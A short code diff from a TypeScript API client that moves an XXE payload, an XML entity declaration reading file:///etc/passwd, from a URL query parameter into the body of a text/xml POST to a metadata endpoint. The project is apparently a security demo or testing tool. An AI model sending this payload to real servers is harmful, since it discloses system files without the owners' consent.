@@ -127,11 +127,11 @@ export function getOidcClient(): Promise<OidcClient> {
 
 export function postMetadata(): Promise<any> {
   return makeApiRequest({
-    url: `${ApiUrl.Metadata}?xml=${encodeURIComponent(
-      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE child [ <!ENTITY child SYSTEM "file:///etc/passwd"> ]><child></child>'
-    )}`,
+    url: `${ApiUrl.Metadata}`,
     method: 'post',
-    headers: { 'content-type': 'text/xml' }
+    headers: { 'content-type': 'text/xml' },
+    data:
+      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE child [ <!ENTITY child SYSTEM "file:///etc/passwd"> ]><child></child>'
   });
 }
 
